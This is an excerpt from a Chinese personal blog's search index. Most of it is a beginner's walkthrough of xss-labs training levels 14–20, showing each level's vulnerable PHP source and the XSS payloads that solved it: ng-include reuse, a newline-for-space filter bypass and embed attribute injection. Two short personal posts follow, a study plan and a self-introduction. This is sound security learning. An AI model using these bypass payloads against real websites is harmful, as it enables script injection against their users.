scrolling=<span class="hljs-string">&quot;no&quot;</span> height=<span class="hljs-number">80</span>%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xss/level15.php?src=<span class="hljs-number">1</span>.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>???<br>查了一下，网站是一个exif查看器用来查看图片信息的  </p><p>那思考一下，竟然都是在我的前端上解析的，那我改host是不是能指向我想指向的ip？  </p><p>和ai探讨了一下，在比赛中一般是有bot来当做用户来访问触发我的xss，而我是不能修改他们的host的  </p><p>所以另一个方向是上传一张会返回xss的图片？  </p><p>问题是在我的环境上无法打开网站，提示：  </p><p>Please turn off your ad blocker.</p><p>要我关掉我的广告拦截器？  </p><p>关了edge的一个相关功能，还是打不开。  </p><p>上网找wp吧。参考<a href="https://www.freebuf.com/articles/web/282983.html">文章</a>  </p><p>网站会解析图片的exif信息，然后返回到前端，在图片的exif里插入xss即可完成攻击  </p><h2 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h2><p>查看源码：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html ng-app&gt;<br>&lt;head&gt;<br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>        &lt;script src=<span class="hljs-string">&quot;angular.min.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level16.php?keyword=test&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level15&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;h1 align=center&gt;欢迎来到第<span class="hljs-number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;<br>&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>只发现可src一个传入点，给ai看了一下，好像要有中间件绕过？  </p><p>上网看wp：  </p><p>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号  </p><p>竟然能直接包含第一关？  </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">所以可以随便包涵之前的一关并对其传参，以达到弹窗的效果，先测试一下过滤了啥，构造payload<br></code></pre></td></tr></table></figure><p>所以就是攻击包含的代码来达到攻击的效果吗？  </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">?src=&#x27;/level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;fff&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><p>通关<br>源wp是下面的payload：  </p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?src=&#x27;/level1.php?name=<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert()</span>&gt;</span>&#x27;</span><br><span class="language-xml">```  </span><br><span class="language-xml"></span><br><span class="language-xml">## level 16  </span><br><span class="language-xml"></span><br><span class="language-xml">依旧偷看源码：  </span><br><span class="language-xml">```php</span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span></span><br><span class="language-javascript"><span class="language-xml">&#123;     </span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span></span><br><span class="language-javascript"><span class="language-xml"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span></span><br><span class="language-javascript"><span class="language-xml">&#125;</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level16<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level16<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);</span><br><span class="language-php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);</span><br><span class="language-php"><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str</span>);</span><br><span class="language-php"><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str2</span>);</span><br><span class="language-php"><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str3</span>);</span><br><span class="language-php"><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&amp;nbsp;&quot;</span>,<span class="hljs-variable">$str4</span>);</span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&quot;</span>.<span class="hljs-variable">$str5</span>.<span class="hljs-string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">level16.png</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span> </span><br><span class="language-php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str5</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>这都过滤了啥？  </p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-keyword">script</span><br>空格<br>/  (可以用来代替空格)<br></code></pre></td></tr></table></figure><p>php的空格绕过是经典必考了，上网一查就有，<br>payload：  </p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img%<span class="hljs-number">0</span>asrc<span class="hljs-operator">=</span><span class="hljs-string">&quot;fff&quot;</span>%<span class="hljs-number">0</span>aonerror<span class="hljs-operator">=</span>alert()&gt;<br></code></pre></td></tr></table></figure><h2 id="level-17"><a href="#level-17" class="headerlink" title="level 17"></a>level 17</h2><p>开题就显示插件不支持。。。。<br>前端html：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html"><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>); </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level17<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level17<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">xsf01.swf?a</span>=<span class="hljs-string">b</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>还是看看源码吧：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>); <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level17&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>依旧看(wp)[<a href="https://blog.csdn.net/l2872253606/article/details/125638898#:~:text=%E7%9B%AE%E5%BD%95level%201level%202level]">https://blog.csdn.net/l2872253606/article/details/125638898#:~:text=%E7%9B%AE%E5%BD%95level%201level%202level]</a>  </p><p>大概是考了embad区域?   </p><p>选择了改一下源码。。。<br>变成了：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=indce.png?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br></code></pre></td></tr></table></figure><p>尝试了：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">arg01</span>=onclick&amp;arg02=alert(1)<br></code></pre></td></tr></table></figure><p>不行，注意到写法里的引号<br>然而正确的payload为：  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?arg02= <span class="hljs-attribute">onclick</span>=alert()<br></code></pre></td></tr></table></figure><p>少了个空格也不行  </p><p>当为arg01时：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">alert(1)</span>= <span class="hljs-string">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure><p>当为 ?arg01&#x3D;onclick&amp;arg02&#x3D;alert(1) 时：  </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?onclick</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure><p>所以说只有当 ?arg02&#x3D; onclick&#x3D;alert() 才能构成：   </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">index.png?</span>= <span class="hljs-string">onclick</span>=<span class="hljs-string">alert()</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>成功后，<span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">level18.php?arg01</span>=<span class="hljs-string">a&amp;arg02</span>=<span class="hljs-string">b</span>&gt;</span>点我进入下一关<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这时的 onclick&#x3D;alert() 才是生效的  </p><h2 id="level-18"><a href="#level-18" class="headerlink" title="level 18"></a>level 18</h2><p>也是和上题一样改了一下源码：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level19.php?arg01=a&amp;arg02=b&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level18&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;embed src=index.png?&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&quot; width=100% heigth=100%&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>没看出来有啥区别，同一个payload过了：  </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?arg02= <span class="hljs-attribute">onclick</span>=alert()<br></code></pre></td></tr></table></figure><h2 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level20.php?arg01=a&amp;arg02=b&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level19&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;embed src=&quot;index.png?&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg01&quot;</span>]).<span class="hljs-string">&quot;=&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;arg02&quot;</span>]).<span class="hljs-string">&#x27;&quot; width=100% heigth=100%&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>需要绕过引号  </p><p>看了网上wp，需要用flash的漏洞，现在网站很多都不用flash了  </p><h2 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h2><p>还是考flash。。。  </p><p>算了，放过我自己吧，，，   </p>]]></content>
    
    
    
    <tags>
      
      <tag>sql-labs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web学习计划</title>
    <link href="/2025/02/25/web%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/"/>
    <url>/2025/02/25/web%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/</url>
    
    <content type="html"><![CDATA[<h1 id="到此为止对自己的总结"><a href="#到此为止对自己的总结" class="headerlink" title="到此为止对自己的总结"></a>到此为止对自己的总结</h1><p>我明白跟去年相比我的实力压根几乎没进步，也不想沉迷小作文检讨。不想成为只会混CTF圈的烂人。</p>  <p>我想变强！我想成为能独当一面的web手！想要成为能不断学习新技术的人。</p>我想凭自己对计算机技术的微薄热爱和功利走下去。<h2 id="对web渗透的学习"><a href="#对web渗透的学习" class="headerlink" title="对web渗透的学习"></a>对web渗透的学习</h2><p>基础实在不牢固，几乎没有明白漏洞的原理，没啥可说的，做题看wp和解释时就十分费劲，就当都没学过，推倒从来吧</p><h1 id="目标（3月20日前）"><a href="#目标（3月20日前）" class="headerlink" title="目标（3月20日前）"></a>目标（3月20日前）</h1><p>1.大致的，系统的学一遍http协议<br>2.学到基础的SQL，sql-labs刷到less-30<br>3.学到基础的xss<br>4.刷完ctfshow web的第一和第二板块<br>5.能达到python和php审计，还有爬虫  </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>自我介绍</title>
    <link href="/2025/02/23/%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/"/>
    <url>/2025/02/23/%E8%87%AA%E6%88%91%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<h2 id="aidemofashi-爱的魔法尸"><a href="#aidemofashi-爱的魔法尸" class="headerlink" title="aidemofashi_爱的魔法尸"></a>aidemofashi_爱的魔法尸</h2><p>在成人之前真想先成为自己。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
